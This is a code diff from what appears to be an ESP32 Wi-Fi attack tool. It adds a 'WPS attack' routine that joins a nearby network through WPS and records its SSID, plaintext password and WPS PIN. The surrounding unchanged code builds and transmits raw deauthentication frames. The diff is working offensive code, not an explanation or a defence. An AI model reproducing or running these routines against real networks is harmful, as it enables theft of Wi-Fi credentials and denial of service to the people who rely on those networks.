@@ -13,10 +13,12 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 
 // Inits
 wifi_config_t ap_config;
+esp_wps_config_t config;
 wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
 static bool wlan_status = false;
 static int timeout = 0; // milis
 static bool rate = false;
+static std::vector<String> wps_data;
 
 // Deauth
 uint8_t deauth_frame_default[26] = {
@@ -29,20 +31,21 @@ uint8_t deauth_frame_default[26] = {
 namespace Drivers
 {
 
-    bool Wifi::init()
+    void Wifi::init()
     {
-
         if (WiFi.mode(WIFI_STA))
         {
             set_tx_power(WIFI_POWER_19_5dBm);
             wlan_status = true;
-            return true;
         }
         else
-        {
             wlan_status = false;
-            return false;
-        }
+    }
+
+    void Wifi::deinit()
+    {
+        WiFi.mode(WIFI_MODE_NULL);
+        wlan_status = false;
     }
 
     std::vector<String> Wifi::scan_aps(std::vector<String> vec)
@@ -215,6 +218,87 @@ namespace Drivers
         return rate;
     }
 
+    void Wifi::wps_config()
+    {
+        config.wps_type = ESP_WPS_MODE;
+        strcpy(config.factory_info.manufacturer, ESP_MANUFACTURER);
+        strcpy(config.factory_info.model_number, ESP_MODEL_NUMBER);
+        strcpy(config.factory_info.model_name, ESP_MODEL_NAME);
+        strcpy(config.factory_info.device_name, ESP_DEVICE_NAME);
+    }
+
+    void Wifi::wps_start()
+    {
+        if (esp_wifi_wps_enable(&config))
+        {
+            wps_data.push_back("WPS Enable Failed");
+        }
+        else if (esp_wifi_wps_start(0))
+        {
+            wps_data.push_back("WPS Start Failed");
+        }
+    }
+
+    void Wifi::wps_stop()
+    {
+        if (esp_wifi_wps_disable())
+        {
+            wps_data.push_back("WPS Disable Failed");
+        }
+    }
+
+    String wpspin2string(uint8_t a[])
+    {
+        char wps_pin[9];
+        for (int i = 0; i < 8; i++)
+        {
+            wps_pin[i] = a[i];
+        }
+        wps_pin[8] = '\0';
+        return (String)wps_pin;
+    }
+
+    void Wifi::wps_event(WiFiEvent_t event, arduino_event_info_t info)
+    {
+        switch (event)
+        {
+        case ARDUINO_EVENT_WIFI_STA_START:
+            wps_data.push_back("WPS Attack: Started");
+            break;
+        case ARDUINO_EVENT_WIFI_STA_GOT_IP:
+            wps_data.push_back("SSID: " + WiFi.SSID());
+            wps_data.push_back("PASS: " + WiFi.psk());
+            break;
+        case ARDUINO_EVENT_WIFI_STA_DISCONNECTED:
+            wps_data.push_back("WPS Attack: Disconn.");
+            WiFi.reconnect();
+            break;
+        case ARDUINO_EVENT_WPS_ER_SUCCESS:
+            wps_stop();
+            delay(10);
+            WiFi.begin();
+            wps_data.push_back("WPS Attack: Success");
+            break;
+        case ARDUINO_EVENT_WPS_ER_FAILED:
+            wps_stop();
+            delay(10);
+            wps_start();
+            wps_data.push_back("WPS Attack: Failed");
+            break;
+        case ARDUINO_EVENT_WPS_ER_TIMEOUT:
+            wps_stop();
+            delay(10);
+            wps_start();
+            wps_data.push_back("WPS Attack: Timedout");
+            break;
+        case ARDUINO_EVENT_WPS_ER_PIN:
+            wps_data.push_back("WPS_PIN: " + wpspin2string(info.wps_er_pin.pin_code));
+            break;
+        default:
+            break;
+        }
+    }
+
 }
 
 namespace Attack
@@ -326,4 +410,29 @@ namespace Attack
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
     }
+
+    void Wifi::wps_listner()
+    {
+        wps_data.clear();
+        delay(10);
+        WiFi.onEvent(Drivers::Wifi::wps_event); // Will call WiFiEvent() from another thread.
+        WiFi.mode(WIFI_MODE_STA);
+        wps_data.push_back("Starting...");
+        Drivers::Wifi::wps_config();
+        Drivers::Wifi::wps_start();
+    }
+
+    std::vector<String> Wifi::wps_updates()
+    {
+        return wps_data;
+    }
+
+    void Wifi::wps_attack_stop()
+    {
+        wps_data.clear();
+        Drivers::Wifi::wps_stop();
+        WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {});
+        WiFi.mode(WIFI_OFF);
+    }
+
 }
